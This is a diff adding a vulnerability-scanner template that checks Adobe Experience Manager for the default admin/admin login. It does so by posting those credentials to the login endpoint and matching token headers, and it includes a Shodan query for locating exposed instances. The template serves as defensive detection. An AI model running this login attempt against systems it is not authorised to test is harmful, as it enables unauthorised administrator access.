@@ -1,0 +1,31 @@
+id: aem-default-login
+
+info:
+  name: Adobe AEM Default Login
+  author: random-robbie
+  severity: high
+  verified: true
+  description: |
+    Adobe AEM default login credentials were discovered.
+    SHODAN: http.component:"Adobe Experience Manager"
+  reference:
+    - https://experienceleague.adobe.com/docs/experience-manager-64/administering/security/security-checklist.html?lang=en
+  tags: aem,default-login,adobe
+  created: 2023/06/24
+
+set:
+  host: request.url.host
+rules:
+  r0:
+    request:
+      method: POST
+      path: /libs/granite/core/content/login.html/j_security_check
+      headers:
+        Referer: "{{host}}/libs/granite/core/content/login.html"
+      body: |
+        _charset_=utf-8&j_username=admin&j_password=admin&j_validate=true
+    expression: |
+      response.status == 200 &&
+      response.raw_header.bcontains(b'login-token') &&
+      response.raw_header.bcontains(b'crx.default')
+expression: r0()
